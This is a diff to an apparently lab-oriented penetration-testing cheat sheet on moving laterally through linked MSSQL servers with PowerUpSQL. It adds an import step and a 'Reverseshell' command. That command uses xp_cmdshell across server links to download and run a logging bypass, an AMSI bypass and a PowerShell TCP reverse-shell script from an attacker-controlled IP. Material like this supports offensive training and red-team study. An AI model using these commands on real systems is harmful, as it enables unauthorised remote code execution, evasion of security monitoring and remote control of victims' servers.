@@ -4,6 +4,9 @@ SQL Servers provide very good options for lateral movement as domain users can b
 
 #### [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
 
+```powershell
+ . .\PowerUpSQL-master\PowerUpSQL.ps1
+```
 ###### Discovery (SPN Scanning) - find all mssql SPNs (default for mssql servers)
 ```powershell
 Get-SQLInstanceDomain
@@ -74,8 +77,11 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''sel
 Run commands using crawler
 ```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "execmaster..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
+```
 
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "execmaster..xp_cmdshell 'cmd /c set username'" 
+Reverseshell
+```powershell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec  master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing  http://172.16.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.X/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
 ```
 
 Manual
